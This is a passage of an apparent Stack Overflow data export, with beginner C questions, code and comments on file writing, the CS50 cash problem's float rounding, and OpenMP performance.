"https://stackoverflow.com/users/5550963/cepb"}, "edited": false, "score": 0, "creation_date": 1524625034, "post_id": 50011526, "comment_id": 87043095, "body": "@GRC no, after i posted this, I just did a quick test write from main and it creates and writes to the file, it&#39;s just the function won&#39;t write and I can&#39;t figure out why."}, {"owner": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 1, "creation_date": 1524655986, "post_id": 50011526, "comment_id": 87058115, "body": "<code>writeOutput</code> doesn&#39;t try to write anything at all. It tries to use its argument as something to read lines from."}, {"owner": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524656191, "post_id": 50011526, "comment_id": 87058270, "body": "<code>getTokensFromLineforOutput</code> does write something, but not to what <code>main</code> has opened, but a stream of its own. This structure is unreadably, sorry."}, {"owner": {"reputation": 11, "user_id": 9655610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8aa10b656f450d01c057579d5e1d92bb?s=128&d=identicon&r=PG&f=1", "display_name": "Ian McMahon", "link": "https://stackoverflow.com/users/9655610/ian-mcmahon"}, "reply_to_user": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524664074, "post_id": 50011526, "comment_id": 87064020, "body": "@ArndtJonasson do you have any possibly recommendations on how to change or fix this?  I&#39;m very new to C so any help would be greatly appreciated"}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "edited": false, "score": 0, "creation_date": 1524679099, "post_id": 50011526, "comment_id": 87073297, "body": "Also, you should check the result of <i>every</i> call to <code>fopen()</code>"}], "answers": [{"comments": [{"owner": {"reputation": 811, "user_id": 9493582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bfI3b.jpg?s=128&g=1", "display_name": "Arndt Jonasson", "link": "https://stackoverflow.com/users/9493582/arndt-jonasson"}, "edited": false, "score": 0, "creation_date": 1524676227, "post_id": 50027460, "comment_id": 87071804, "body": "It shouldn&#39;t matter."}], "tags": [], "owner": {"reputation": 111, "user_id": 8524753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ebcd2400b0b39a1b12547addca7700?s=128&d=identicon&r=PG&f=1", "display_name": "Dustin177820", "link": "https://stackoverflow.com/users/8524753/dustin177820"}, "is_accepted": false, "score": -1, "last_activity_date": 1524674895, "creation_date": 1524674895, "answer_id": 50027460, "question_id": 50011526, "link": "https://stackoverflow.com/questions/50011526/program-creates-a-file-but-wont-write-to-it/50027460#50027460", "title": "program creates a file, but won&#39;t write to it", "body": "<p>(If I could comment this I would)</p>\n\n<p>Try putting parentheses around your de referencing * and variable..</p>\n\n<pre><code>(ch = (*inThLine)) \n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 9655610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8aa10b656f450d01c057579d5e1d92bb?s=128&d=identicon&r=PG&f=1", "display_name": "Ian McMahon", "link": "https://stackoverflow.com/users/9655610/ian-mcmahon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 70, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1524674895, "creation_date": 1524608703, "question_id": 50011526, "link": "https://stackoverflow.com/questions/50011526/program-creates-a-file-but-wont-write-to-it", "title": "program creates a file, but won&#39;t write to it", "body": "<p>I'm very novice at C but I'm trying to learn.  I'm trying right now to make a program read from a csv file and take only it's integers from it, and write those out to a seperate .txt file.  I'm not seeing why it will create a file, but why it won't write anything to it.  Here's the code.  in the methods 'getTokensFromLineforOutput' and 'writeOutput' is where I try to do my writing, everything else works fine, and if you were to take away those two methods and run it as just a program reading from a csv file it operates as intended.  But writing is where I'm running into.  IDK if i'm able to attach a document so for reference here's the csv file I made from notepad:</p>\n\n<p>3,1, joe</p>\n\n<p>45,0, sandy</p>\n\n<p>5,1, mary</p>\n\n<p>12,0, eugene</p>\n\n<p>11,0, alex</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\n\n#define NAMESIZE 30\n#define ARRAYSIZE 100\n#define ROWLENGTH 300\n#define TOKENLENGTH 10\n\ntypedef struct {\n    int nWeeks;\n    bool isCensored;\n    char identifier[NAMESIZE];\n}SurvivalPatientData;\n\n\n\n\nbool giveMeALine(FILE * source, char * dest)\n{\n    bool status = false;\n    char * where = dest;\n    char ch;\n    int ch_ctr = 0;\n    while(((ch = getc(source)) != EOF) &amp;&amp; (ch != '\\n') &amp;&amp; (ch != '\\r'))\n    {\n        *where = ch;\n        where++;\n        ch_ctr++;\n        status = true;\n    }\n    for (int i=ch_ctr; i&lt;ROWLENGTH &amp;&amp; status ;i++)\n    {\n        *where= '\\0'; /*null*/\n        where++;\n    }\n    printf(\"giveMeALine returning status = %d\\n\",status);\n    return status;\n}\n\nbool getTokensFromLineforOutput(char *theLine, SurvivalPatientData *sdp) {\n    bool status = false;\n    FILE * file = fopen(\"C:/Users/Default/Desktop/CCSU/CCSU SPRING 18/CS_3//output.txt\", \"w\");\n    char * inTheLine = theLine;\n    char theToken[TOKENLENGTH];\n    char * inToken = theToken;\n\n    char ch = '\\0';\n    for (int i = 0; i&lt;TOKENLENGTH; i++)\n    {\n        theToken[i]='\\0'; /*null char*/\n    }\n    int value = 0;\n    while((ch=*inTheLine)!=',')\n    {\n        value *= 10;\n        value += ch - '0';\n        inTheLine++;\n    }\n    sdp-&gt;nWeeks=value;\n    fprintf(file, \"%d\\n\",sdp-&gt;nWeeks);\n    inTheLine++;\n    for (int i = 0; i&lt;TOKENLENGTH; i++)\n    {\n        theToken[i]='\\0'; /*null char*/\n    }\n    inToken = theToken;\n    inTheLine++;\n    while((ch=*inTheLine)!=',')\n    {\n        *inToken = ch;\n        inToken++;\n        inTheLine++;\n    }\n    inToken--;\n    if (*inToken == '0')\n    {\n        sdp-&gt;isCensored=false;\n    }\n    else\n    {\n        sdp-&gt;isCensored= true;\n    }\n    fprintf(file, \"%d\\n\",sdp-&gt;isCensored);\n    inTheLine++;\n    for (int i = 0; i&lt;TOKENLENGTH; i++)\n    {\n        theToken[i]='\\0'; /*null char*/\n    }\n    inToken = sdp-&gt;identifier;\n    while((ch=*inTheLine)!=',' &amp;&amp; ch!= EOF)\n    {\n        *inToken = ch;\n        inToken++;\n        inTheLine++;\n    }\n    status=true;\n    return status;\n}\n\nbool getTokensFromLine(char * theLine,\n                       SurvivalPatientData * sdp);\n\nbool getTokensFromLine(char *theLine, SurvivalPatientData *sdp) {\n    bool status = false;\n\n    char * inTheLine = theLine;\n    char theToken[TOKENLENGTH];\n    char * inToken = theToken;\n    char ch = '\\0';\n    for (int i = 0; i&lt;TOKENLENGTH; i++)\n    {\n        theToken[i]='\\0'; /*null char*/\n    }\n    int value = 0;\n    while((ch=*inTheLine)!=',')\n    {\n        value *= 10;\n        value += ch - '0';\n        inTheLine++;\n    }\n    sdp-&gt;nWeeks=value;\n    printf(\"Weeks is %d\\n\",sdp-&gt;nWeeks);\n    inTheLine++;\n    for (int i = 0; i&lt;TOKENLENGTH; i++)\n    {\n        theToken[i]='\\0'; /*null char*/\n    }\n    inToken = theToken;\n    inTheLine++;\n    while((ch=*inTheLine)!=',')\n    {\n        *inToken = ch;\n        inToken++;\n        inTheLine++;\n    }\n    inToken--;\n    if (*inToken == '0')\n    {\n        sdp-&gt;isCensored=false;\n    }\n    else\n    {\n        sdp-&gt;isCensored= true;\n    }\n    printf(\"isCensored is %d\\n\",sdp-&gt;isCensored);\n    inTheLine++;\n    for (int i = 0; i&lt;TOKENLENGTH; i++)\n    {\n        theToken[i]='\\0'; /*null char*/\n    }\n    inToken = sdp-&gt;identifier;\n    while((ch=*inTheLine)!=',' &amp;&amp; ch!= EOF)\n    {\n        *inToken = ch;\n        inToken++;\n        inTheLine++;\n    }\n    printf(\"The identifier is %s\\n\",sdp-&gt;identifier);\n    status=true;\n    return status;\n}\n\nbool writeOutput(FILE * source, SurvivalPatientData * gotIt){\n    bool status = false;\n    bool write = false;\n\n    for (int j = 0; j&lt;ARRAYSIZE; j++){\n        for (int i = 0; i&lt;NAMESIZE; i++){\n            (gotIt[j].identifier)[i]='\\x20';\n        }\n        gotIt[j].nWeeks = 0;\n        gotIt[j].isCensored = false;\n    }\n    int nrows = 0;\n    int row = 0;\n    char readALine[ROWLENGTH];\n    bool lines2Read = true;\n    bool gotTokens = false;\n\n    while (lines2Read){\n        bool gotALine = giveMeALine(source, readALine);\n        if(!gotALine){\n            lines2Read = false;\n        } else {\n            gotTokens = getTokensFromLineforOutput(readALine, &amp;(gotIt[row]));\n\n            if(gotTokens){\n                status = true;\n                row++;\n                nrows++;\n            }\n        }\n    }\n    return status;\n}\n\n\nbool getInputFancy(FILE * source, SurvivalPatientData * gotIt){\n    bool status = false;\n    for (int j = 0; j&lt;ARRAYSIZE; j++){\n        for (int i = 0; i&lt;NAMESIZE; i++){\n            (gotIt[j].identifier)[i]='\\x20';\n        }\n        gotIt[j].nWeeks = 0;\n        gotIt[j].isCensored = false;\n    }\n    int nrows = 0;\n    int row = 0;\n    char readALine[ROWLENGTH];\n    bool lines2Read = true;\n    bool gotTokens = false;\n\n    while (lines2Read){\n        bool gotALine = giveMeALine(source, readALine);\n        if(!gotALine){\n            lines2Read = false;\n        } else {\n            puts(readALine);\n            gotTokens = getTokensFromLine(readALine, &amp;(gotIt[row]));\n\n            if(gotTokens){\n                printf(\"found %d row\\n\", row);\n                status = true;\n                row++;\n                nrows++;\n            }\n        }\n    }\n            printf(\"found %d rows\\n\", nrows);\n            return status;\n}\n\n\nint main() {\n    printf(\"Hello, World!\\n\");\n    bool readIt = false;\n    bool write = false;\n    SurvivalPatientData gotIt[ARRAYSIZE];\n    FILE * whereInputIs = fopen(\"C:/Users/Default/Desktop/CCSU/CCSU SPRING 18/CS_3//retake.csv\", \"r\");\n    FILE * whereOutputIs = fopen(\"C:/Users/Default/Desktop/CCSU/CCSU SPRING 18/CS_3//output.txt\", \"w\");\n    if (whereInputIs == NULL){\n        perror(\"can't open file source/doesn't exist\");\n    }\n    puts(\"Found the file\");\n    readIt = getInputFancy(whereInputIs, gotIt);\n    write = writeOutput(whereOutputIs, gotIt);\n    if (!readIt)\n    {\n        perror(\"could not read that file\");\n    }\n    puts(\"!!!read the file!!!\");\n\n    if (fclose ( whereInputIs) != 0) {\n        perror(\"trouble trying to close\");\n    }\n    puts(\"!!!closed the file!!!\");\n\n\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "cs50"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 3, "creation_date": 1524606777, "post_id": 50011194, "comment_id": 87038913, "body": "Don&#39;t use floating points for currency, that never works because of the nature of floating points. Use integers (times 100) instead, instead of using 0.01 for 1 cent, use 1 for 1 cent, and 100 for 1 dollar."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 0, "creation_date": 1524608342, "post_id": 50011194, "comment_id": 87039421, "body": "What, exactly, is <code>change = (change * 100) &#47; 0.01;</code> supposed to accomplish?  Are you intending to multiply your <code>change</code> value by 10,000?  As to your specific issue, quarters are not the largest denomination of change - you forgot about half-dollars."}, {"owner": {"reputation": 11, "user_id": 9693669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8a5be3c61af41dbcd815848cab53011?s=128&d=identicon&r=PG&f=1", "display_name": "leh_ros", "link": "https://stackoverflow.com/users/9693669/leh-ros"}, "edited": false, "score": 0, "creation_date": 1524609723, "post_id": 50011194, "comment_id": 87039757, "body": "Thanks for the answers. The assignment actually specifies that half dollars should not be used, sorry I forgot to mention that. And about the multiplication... to be honest  I&#39;m not sure why I used this exact value, I just tried a bunch of things x.x but if the user input is something like &quot;75&quot; it should be read as 75 dollars, so it returns 300. And this value worked for this purpose, but I still can&#39;t fix the problem when the input is &quot;4.2&quot;, or any other number like this one."}], "answers": [{"comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1597674266, "post_id": 63452651, "comment_id": 112203004, "body": "I doubt there is much benefit to provide identical answers to a set of duplicate questions that have been asked years ago."}, {"owner": {"reputation": 145, "user_id": 14082778, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DA3rn.jpg?s=128&g=1", "display_name": "Lost in code", "link": "https://stackoverflow.com/users/14082778/lost-in-code"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1597674362, "post_id": 63452651, "comment_id": 112203068, "body": "Sorry I just know that they are different people and what to help everyone I can."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1597674449, "post_id": 63452651, "comment_id": 112203122, "body": "If they took the CS50 course in 2017 or 2018 they probably solved it by now. ;)"}, {"owner": {"reputation": 145, "user_id": 14082778, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DA3rn.jpg?s=128&g=1", "display_name": "Lost in code", "link": "https://stackoverflow.com/users/14082778/lost-in-code"}, "reply_to_user": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1597674632, "post_id": 63452651, "comment_id": 112203232, "body": "Yeah didn&#39;t think &#39;bout that. Thou if someone else searches the answer when they have the same problem as in the question it might prove useful :)"}], "tags": [], "owner": {"reputation": 145, "user_id": 14082778, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DA3rn.jpg?s=128&g=1", "display_name": "Lost in code", "link": "https://stackoverflow.com/users/14082778/lost-in-code"}, "is_accepted": false, "score": 0, "last_activity_date": 1597675693, "last_edit_date": 1597675693, "creation_date": 1597673510, "answer_id": 63452651, "question_id": 50011194, "link": "https://stackoverflow.com/questions/50011194/cs50-pset1-cash-expected-18-n-not-22-n/63452651#63452651", "title": "Cs50 pset1-cash expected &quot;18\\n&quot;, not &quot;22\\n&quot;", "body": "<p>Use the round function to round up your numbers. In this part of your code, you need to add the round function.</p>\n<pre class=\"lang-c prettyprint-override\"><code>change = (change * 100) / 0.01;\n</code></pre>\n<p>It has to be like this:</p>\n<pre class=\"lang-c prettyprint-override\"><code>cents = round(change * 100);\n</code></pre>\n<p>This will round up the numbers to the nearest wholeIf you have other such problems, you can use a debugger such as debug50, in which you put a breakpoint by clicking in the right of the line number, then in your terminal window(the one where you execute clang) you should type:</p>\n<pre class=\"lang-c prettyprint-override\"><code>~/pset1/cash/ $ debug50 ./cash\n</code></pre>\n<p>Or whatever your program is called. This will open the debugger and inside it you will find all the variables and what they are equal to. Press on the button next to the play button to move one line of code forward.</p>\n<p>P.S\nThere are lots of questions exactly like yours. Just search your problem into the Search... at the top of your screen and I daresay you'll find an answer to your problem.</p>\n"}], "owner": {"reputation": 11, "user_id": 9693669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b8a5be3c61af41dbcd815848cab53011?s=128&d=identicon&r=PG&f=1", "display_name": "leh_ros", "link": "https://stackoverflow.com/users/9693669/leh-ros"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 656, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1597675693, "creation_date": 1524606584, "last_edit_date": 1524611694, "question_id": 50011194, "link": "https://stackoverflow.com/questions/50011194/cs50-pset1-cash-expected-18-n-not-22-n", "title": "Cs50 pset1-cash expected &quot;18\\n&quot;, not &quot;22\\n&quot;", "body": "<p>I'm a begginer in C and I'm taking cs50. I'm having trouble with pset1/cash. I have no idea what is wrong with my code. The program first asks the user how much change is owed and then spits out the minimum number of coins with which said change can be made. It works fine with most inputs but when I check it I get <strong>expected \"18\\n\", not \"22\\n\"</strong>  Please, what do I need to change?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cs50.h&gt;\n\nint main(void)\n{\n    float change;\n    int cents, cents2, cents3, cents4;\n    int total = 0;\n\n    //Ask for user input and check\n    do\n    {\n        change = get_float(\"How much change?\\n\");\n    }\n    while (change &lt; 0);\n    change = (change * 100) / 0.01;\n\n    //Multiply the float numbers\n    if (change &lt; 1)\n    {\n        change *= 100;\n    }\n    else if (change &lt; 10)\n    {\n        change *= 10;\n    }\n\n    //Change to int\n    cents = change;\n\n    //How many quarters\n    while (cents &gt;= 2500)\n    {\n        cents -= 2500;\n        total++;\n    }\n    cents2 = cents;\n\n    //How many dimes\n    while (cents2 &gt;= 1000)\n    {\n        cents2 -= 1000;\n        total++;\n    }\n    cents3 = cents2;\n\n    //How many nickels\n    while (cents3 &gt;= 500)\n    {\n        cents3 -= 500;\n        total++;\n    }\n    cents4 = cents3;\n\n    //How many pennies\n    while (cents4 &gt;= 100)\n    {\n        cents4 -= 100;\n        total++;\n    }\n\n    printf(\"%i\\n\", total);\n}\n</code></pre>\n\n<p><strong>Edit:</strong> I have finally found my error. In this line: change = (change * 100) / 0.01; I added 0.01 to it and now it works.\n<strong>change = (change * 10000) + 0.01;</strong></p>\n"}, {"tags": ["c", "multithreading", "parallel-processing", "openmp"], "comments": [{"owner": {"reputation": 628808, "user_id": 139985, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/147c5a9cc1feec049c50da791ac7d144?s=128&d=identicon&r=PG", "display_name": "Stephen C", "link": "https://stackoverflow.com/users/139985/stephen-c"}, "edited": false, "score": 1, "creation_date": 1524619241, "post_id": 50011103, "comment_id": 87041850, "body": "Try the approaches suggested here: <a href=\"https://stackoverflow.com/questions/7181078/how-to-profile-openmp-bottlenecks\" title=\"how to profile openmp bottlenecks\">stackoverflow.com/questions/7181078/&hellip;</a>"}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1524623664, "post_id": 50011103, "comment_id": 87042772, "body": "How many CPUs does your computer have?"}, {"owner": {"reputation": 87, "user_id": 6313460, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ffe4ef1e3e956ba646658b21f53814b?s=128&d=identicon&r=PG", "display_name": "Sanjiv Pradhanang", "link": "https://stackoverflow.com/users/6313460/sanjiv-pradhanang"}, "edited": false, "score": 0, "creation_date": 1524627786, "post_id": 50011103, "comment_id": 87043686, "body": "My computer has two"}, {"owner": {"reputation": 87, "user_id": 6313460, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ffe4ef1e3e956ba646658b21f53814b?s=128&d=identicon&r=PG", "display_name": "Sanjiv Pradhanang", "link": "https://stackoverflow.com/users/6313460/sanjiv-pradhanang"}, "reply_to_user": {"reputation": 628808, "user_id": 139985, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/147c5a9cc1feec049c50da791ac7d144?s=128&d=identicon&r=PG", "display_name": "Stephen C", "link": "https://stackoverflow.com/users/139985/stephen-c"}, "edited": false, "score": 0, "creation_date": 1524628018, "post_id": 50011103, "comment_id": 87043761, "body": "@StephenC The critical block is not the problem here though. Even without it, the speed is kind of same as it only handles a small part of the code. It is just there to provide clean ouput."}, {"owner": {"reputation": 628808, "user_id": 139985, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/147c5a9cc1feec049c50da791ac7d144?s=128&d=identicon&r=PG", "display_name": "Stephen C", "link": "https://stackoverflow.com/users/139985/stephen-c"}, "edited": false, "score": 0, "creation_date": 1524628439, "post_id": 50011103, "comment_id": 87043865, "body": "So have you profiled the code yet?  As suggested in the Q that I linked to?  Or you just <b>guessing</b> where the bottleneck is?"}, {"owner": {"reputation": 87, "user_id": 6313460, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ffe4ef1e3e956ba646658b21f53814b?s=128&d=identicon&r=PG", "display_name": "Sanjiv Pradhanang", "link": "https://stackoverflow.com/users/6313460/sanjiv-pradhanang"}, "reply_to_user": {"reputation": 628808, "user_id": 139985, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/147c5a9cc1feec049c50da791ac7d144?s=128&d=identicon&r=PG", "display_name": "Stephen C", "link": "https://stackoverflow.com/users/139985/stephen-c"}, "edited": false, "score": 0, "creation_date": 1524638705, "post_id": 50011103, "comment_id": 87047576, "body": "@StephenC Sorry, I didn&#39;t profile it but I am not guessing, I am getting same duration of time printed with and without the critical block."}, {"owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "edited": false, "score": 2, "creation_date": 1524641279, "post_id": 50011103, "comment_id": 87048905, "body": "If you want to discuss performance in a question on SO, you <b>must always provide specific numbers</b> and a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> that <b>includes necessary input files</b>."}, {"owner": {"reputation": 87, "user_id": 6313460, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ffe4ef1e3e956ba646658b21f53814b?s=128&d=identicon&r=PG", "display_name": "Sanjiv Pradhanang", "link": "https://stackoverflow.com/users/6313460/sanjiv-pradhanang"}, "reply_to_user": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "edited": false, "score": 0, "creation_date": 1524674119, "post_id": 50011103, "comment_id": 87070750, "body": "@Zulan Thank you! That&#39;s what I was doing wrong. And thank you all too that led me to the solution. I had to get this done by the end of this semester. Y&#39;all are incredible!"}, {"owner": {"reputation": 87, "user_id": 6313460, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ffe4ef1e3e956ba646658b21f53814b?s=128&d=identicon&r=PG", "display_name": "Sanjiv Pradhanang", "link": "https://stackoverflow.com/users/6313460/sanjiv-pradhanang"}, "reply_to_user": {"reputation": 4217, "user_id": 9614249, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJfci.png?s=128&g=1", "display_name": "Increasingly Idiotic", "link": "https://stackoverflow.com/users/9614249/increasingly-idiotic"}, "edited": false, "score": 0, "creation_date": 1524777839, "post_id": 50011103, "comment_id": 87120538, "body": "@IncreasinglyIdiotic yeah, the link that Zulan mentioned in his comment. I accepted it"}], "owner": {"reputation": 87, "user_id": 6313460, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ffe4ef1e3e956ba646658b21f53814b?s=128&d=identicon&r=PG", "display_name": "Sanjiv Pradhanang", "link": "https://stackoverflow.com/users/6313460/sanjiv-pradhanang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 65, "favorite_count": 0, "closed_date": 1524777797, "answer_count": 0, "score": 1, "last_activity_date": 1524618678, "creation_date": 1524606149, "last_edit_date": 1524618678, "question_id": 50011103, "link": "https://stackoverflow.com/questions/50011103/openmp-is-not-improving-the-performance", "closed_reason": "Duplicate", "title": "OpenMP is not improving the performance", "body": "<p>So, I believe that the code below, even though I see no errors, is not being able to parallelize my performance and acts as if it is a normal single thread program. </p>\n\n<p>Using <code>OpenMP</code> in <em>C</em>, I am trying to find the intersections between adjacency lists read from a file. I don't know whether my code is I/O bound, or my directives are not placed correctly, loop is incorrect, the way I am recording time or can it be due to some system requirements? The <code>omp_set_num_threads()</code> seems to work fine. </p>\n\n<p>Anything you guys think I should check that may be the problem with <code>OpenMP</code>, I would be glad to know. I know it's something related to <code>OMP</code> as I have written a similar code in <code>MPI</code> that gives the expected performance. Thanks!</p>\n\n<pre><code>#include &lt;omp.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n\n#define MAX 20000    //number of vertices we are working with\n#define EACHLINE 99000  //max chars each line of file could possess\n\nint *allLines[MAX];        //stores all the lines, hopefully\nint lengths[MAX];\nint lines = 0;\n\n//function for getting intersecton of two arrays\nvoid getIntersections(int *one, int *two, int l1, int l2){   \n//arrays and their sizes\n    #pragma omp critical\n    {\n        printf(\"%d &amp; %d: [ \", *one, *two);\n        for(int o=1; o&lt;l1; o++){\n            for(int t=1; t&lt;l2; t++){\n                if(*(one+o)==*(two+t)){\n                     printf(\"%d \", *(one+o));\n                     break;\n                }\n            }\n        }\n        printf(\"]\\n\");\n    }\n}\n\n//getting common ones out of the adjacency lists with vertices v1 &amp; v2\nvoid getLists(int v1, int v2){\n    int r, s, length1, length2;\n    int *arr1, *arr2; \n    int done = 0;\n    for(r=0; r&lt;lines; r++){\n        if( *(allLines[r]) == v1){\n            int *arr11 = malloc(sizeof(int)*lengths[r]);\n            length1 = lengths[r];\n            arr11 = allLines[r];\n            arr1 = arr11;\n            if(done&gt;0)\n                break;\n            done = 1;\n        }\n        else if( *(allLines[r]) == v2){\n            int *arr22 = malloc(sizeof(int)*lengths[r]);\n            length2 = lengths[r];\n            arr22 = allLines[r];\n            arr2 = arr22;\n            if(done&gt;0)\n                break;\n            done = 1;\n        }    \n    }\n    getIntersections(arr1, arr2, length1, length2);\n}\n\nint main(int argc, char** argv){\n\n    //getting number of lines in file\n    FILE *tp = fopen(\"r2.txt\",\"r\");\n    int ch=0;\n    while ((ch = fgetc(tp)) != EOF){\n        if (ch == '\\n')\n            lines++;\n    }\n    fclose(tp);\n\n    FILE* fp;\n    if((fp = fopen(\"r2.txt\", \"r\")) == NULL){        //opens file\n        perror(\"Error opening file!\");\n        return 1;\n    }\n\n    char input[EACHLINE];\n    for(int g = 0; g &lt; lines; g++){   //dividing task among processes\n        int arr[MAX], length = 0, c, bytesread;\n\n        fgets(input, sizeof(input), fp);\n        char* str = input;               //list buffer\n        while (sscanf(str, \"%d%n\", &amp;c, &amp;bytesread) &gt; 0) {  \\\n        //changing string of spaced numbers to int array\n            arr[length++] = c;\n            str += bytesread;\n        }\n        int *rr = malloc(sizeof(int)*length);\n        for(int i=0; i &lt; length; i++) {\n            *(rr+i) = arr[i];       \n        }\n        allLines[g] = rr;\n        lengths[g] = length;        \n    }       \n\n    clock_t start, end;     //clocks\n    double cpu_time_used;   //time recorder\n    start = clock();\n\n    omp_set_num_threads(81);\n    int r, s;\n    #pragma omp parallel private(r, s) shared(lengths, allLines, lines)\n    {   \n        #pragma omp for\n        for(r=0; r&lt;lines; r++){\n            for(s=0; s &lt; lengths[r]; s++){  \n                if( *(allLines[r]) &lt; *(allLines[r]+s) ){\n                    getLists( *(allLines[r]), *(allLines[r]+s) );\n                }\n            }      \n        }\n    }\n    end = clock();  //timer stop\n    cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;   \n    //time taken\n    printf(\"Time: %f\\n\", cpu_time_used);\n\n    for(int k=0; k&lt;lines; k++)\n        free(allLines[k]);  \n\n    fclose(fp);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "shell", "stdout", "putchar"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1524606220, "post_id": 50011001, "comment_id": 87038740, "body": "Which platform are you experimenting on?  Does <code>putc(c, stdout)</code> work as expected after switching files?  What about <code>fputc(c, stdout)</code>?  On the surface, you are simply changing what file descriptor 0 references; the standard I/O code should continue to work, writing to file descriptor 0.  Are you sure that <code>fd1</code> is open for writing?  (I know 